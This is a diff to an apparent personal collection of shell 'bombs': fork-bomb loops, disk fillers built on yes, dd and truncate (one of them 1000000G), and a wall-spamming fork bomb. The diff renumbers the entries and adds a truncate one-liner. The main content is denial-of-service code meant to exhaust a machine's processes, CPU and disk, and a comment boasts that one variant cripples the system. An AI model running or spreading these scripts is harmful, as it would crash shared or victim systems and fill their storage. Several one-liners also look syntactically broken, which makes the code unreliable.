@@ -3,7 +3,7 @@
 #hdd-fillers are just meant to fill the hard drive quickly. CPU may be used up, but usually not fully.
 #wallbomb takes up CPU and is super annoying
 
-#yesbomb two
+#yesbomb one
 #oneliner
 :{for(( i=0;;i+=1));do;yes balls>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
 #full
@@ -23,7 +23,7 @@ while true; do
 	counter+=1
 done
 
-#yesbomb three
+#yesbomb two
 #oneliner
 :{for((i=0;;i+=1));do;man bash|yes>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
 #full
@@ -43,9 +43,9 @@ while true; do
 	counter+=1
 done
 
-#bomb four (truncate) - needs testing
+#bomb three (truncate) - needs testing
 #oneliner
-
+:{for((i=0;;i+=1));do;truncate -s 1G .$1$i&disown;done};:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
 #full
 :
 {
@@ -62,7 +62,7 @@ while true; do
 	counter+=1
 done
 
-#bomb five (dd) - tested and rapes system
+#bomb four (dd) - tested and rapes system
 #oneliner
 
 #full
@@ -81,7 +81,7 @@ while true; do
 	counter+=1
 done
 
-#bombsix truncate and morph - needs testing
+#bomb five truncate and morph - needs testing
 #bomb and hdd-filler
 #oneliner
 
@@ -108,8 +108,9 @@ dd if=/dev/urandom of=./.file & disown
 truncate -s 1000000G .file & disown
 
 #wallbomb
+#oneliner
 :(){echo "balls"|wall;:|:&disown};:&disown
-#long version of wallbomb
+#full
 :
 {
 	echo "balls" | wall
